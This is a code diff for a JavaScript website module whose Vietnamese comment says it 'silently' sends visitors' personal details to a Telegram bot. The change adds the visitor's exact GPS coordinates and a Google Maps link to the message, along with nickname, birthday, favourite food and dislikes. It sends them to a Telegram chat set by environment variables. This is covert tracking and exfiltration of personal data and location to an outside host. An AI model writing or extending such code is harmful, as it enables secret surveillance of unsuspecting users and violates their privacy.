@@ -1,7 +1,7 @@
 /**
  * Gửi thông tin người dùng về Telegram Bot một cách âm thầm.
  */
-export const sendTelegramMessage = async (userData) => {
+export const sendTelegramMessage = async (userData, locationData = null) => {
   const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
   const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
@@ -10,16 +10,22 @@ export const sendTelegramMessage = async (userData) => {
     return;
   }
 
-  const text = `
+  let text = `
 🚀 *THÔNG BÁO MỚI TỪ WEBSITE*
 --------------------------
-👤 *Biệt danh:* ${userData.nickname || 'Không có'}
-🎂 *Sinh nhật:* ${userData.birthday || 'Không có'}
-🍜 *Món yêu thích:* ${userData.favoriteFood || 'Không có'}
-❌ *Điều không thích:* ${userData.dislike || 'Không có'}
---------------------------
-🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN')}
-  `.trim();
+👤 *Biệt danh:* ${userData?.nickname || 'Không có'}
+🎂 *Sinh nhật:* ${userData?.birthday || 'Không có'}
+🍜 *Món yêu thích:* ${userData?.favoriteFood || 'Không có'}
+❌ *Điều không thích:* ${userData?.dislike || 'Không có'}
+`.trim();
+
+  if (locationData) {
+    const { latitude, longitude } = locationData;
+    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    text += `\n\n📍 *VỊ TRÍ THỰC TẾ (GPS):*\n[Xem trên Google Maps](${mapsLink})\n(Lat: ${latitude}, Lng: ${longitude})`;
+  }
+
+  text += `\n--------------------------\n🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN')}`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
